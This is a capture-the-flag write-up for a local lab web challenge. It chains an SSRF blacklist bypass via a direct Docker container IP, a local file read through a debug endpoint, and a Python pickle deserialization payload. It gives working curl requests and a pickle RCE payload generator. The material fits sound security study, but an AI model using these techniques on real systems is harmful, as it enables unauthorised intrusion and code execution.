---
doc_kind: writeup
title: "SSRF IP Bypass to LFI to Pickle RCE Chain"
category: web
slug: ssrf-ip-bypass-to-lfi-pickle-chain
created: 2026-03-28
status: solved
tags:
  - ssrf
  - lfi
  - pickle
  - deserialization
  - chain
---

# SSRF IP Bypass to LFI to Pickle RCE Chain

## Challenge Summary

- Source: Local CTF lab (web-advanced-chain)
- Target: http://localhost:5003/proxy?url=
- Goal: Exploit multi-step vulnerability chain to read /flag

## Initial Signals

- Entry point: `/proxy?url=` endpoint with SSRF blacklist
- Visible hints: "No internal access allowed", internal_api node mentioned
- First confirming probe: External URL worked, 127.0.0.1 blocked

## Exploit Chain

### Step 1: SSRF IP Bypass
- **Blacklist Analysis**: Only blocked `localhost`, `127.0.0.1`, `127.1`, `2130706433`, and IPs starting with `127.`
- **Docker Network Discovery**: `internal_api` container at `172.21.0.2`
- **Bypass**: Direct IP access bypassed hostname-based blacklist

### Step 2: LFI File Read
- **Endpoint**: `/debug?path=` on internal service
- **Capability**: Arbitrary file read on internal_api container
- **Files Read**: `/flag`, `config.txt`, `/app/app.py`

### Step 3: Pickle Deserialization RCE (Available but blocked by frontend)
- **Endpoint**: `/load` POST endpoint
- **Vulnerability**: `pickle.loads(base64.b64decode(data))`
- **Note**: POST method blocked by frontend proxy, but LFI was sufficient

## Key Evidence

- **Docker Networks**: `web-advanced-chain_isolation_net` (172.21.0.0/16)
- **Container IPs**: front=172.21.0.3, internal_api=172.21.0.2
- **Source Code**: Confirmed pickle deserialization vulnerability
- **Flag Location**: `/flag` on internal_api container

## Dead Ends

- Attempted hostname-based bypasses (DNS rebinding, @ symbol, etc.) - unnecessary
- Overcomplicated the SSRF bypass - direct IP was simplest solution
- POST requests blocked by frontend - couldn't complete pickle RCE (LFI sufficient)

## Payloads And Commands

```bash
# Step 1: Discover network topology
docker network inspect web-advanced-chain_isolation_net

# Step 2: Access internal service via IP (bypass hostname blacklist)
curl "http://localhost:5003/proxy?url=http://172.21.0.2:8000/"

# Step 3: LFI read flag
curl "http://localhost:5003/proxy?url=http://172.21.0.2:8000/debug?path=/flag"

# Step 4: Read config and source
curl "http://localhost:5003/proxy?url=http://172.21.0.2:8000/debug?path=config.txt"
curl "http://localhost:5003/proxy?url=http://172.21.0.2:8000/debug?path=/app/app.py"

# Step 5: Generate pickle RCE payload (if POST was allowed)
python3 -c "
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
"
```

## Flag / Outcome

- **Flag**: `CTF{advanced_chain_ssrf_to_lfi_to_pickle_rce_2026}`
- **Secret Key**: `super_secret_ctf_chain_key_2026`
- **Full Chain**: SSRF IP Bypass → LFI → Flag Read (Pickle RCE available)

## Reusable Lessons

1. **IP-based SSRF Bypass**: When hostname is blocked, try direct container IP from Docker network
2. **Network Enumeration**: `docker network inspect` reveals internal topology
3. **Multi-Step Chains**: Don't overcomplicate early steps - verify simplest approach first
4. **LFI over RCE**: File read may be sufficient; don't need RCE if goal is just reading files
5. **Blacklists are Hard**: Developers often forget to block all internal IP ranges

## Pattern Candidates

- **Update**: `ssrf-to-lfi-to-localhost-rce` - add Docker IP bypass section
- **New Pattern**: `docker-container-ssrf-ip-bypass` - specific to containerized environments
  - Subnet discovery via Docker network inspect
  - Common container IPs: 172.x.x.x, 10.x.x.x
  - Service discovery by port scanning internal IPs
- **New Pattern**: `python-pickle-deserialization` - pickle.loads() exploitation
